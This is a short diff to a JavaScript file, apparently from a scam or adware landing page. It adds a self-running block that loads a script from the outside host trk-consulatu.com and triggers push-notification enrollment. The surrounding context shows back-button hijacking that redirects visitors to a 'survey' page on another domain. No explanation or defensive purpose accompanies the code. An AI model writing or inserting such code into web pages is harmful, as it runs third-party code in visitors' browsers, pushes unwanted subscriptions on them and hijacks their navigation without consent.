@@ -16,6 +16,20 @@ function datehax() {
     return "" + montharray[month] + " " + daym + ", " + year + "";
 }
 
+
+(function (document, window) {
+    var script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = "https://trk-consulatu.com/scripts/push/script/64d5p99gj0?url=" + encodeURI(self.location.hostname);
+    script.onload = function () {
+        push_init();
+        push_subscribe();
+    };
+    document.getElementsByTagName("head")[0].appendChild(script);
+})(document, window);
+
+
+
 (function (window, location) {
     var redirect = "http://go.pixelwort.com/ts7951-backbutton-survey-ww";
     var currentUrl = location.origin + location.pathname + location.search;
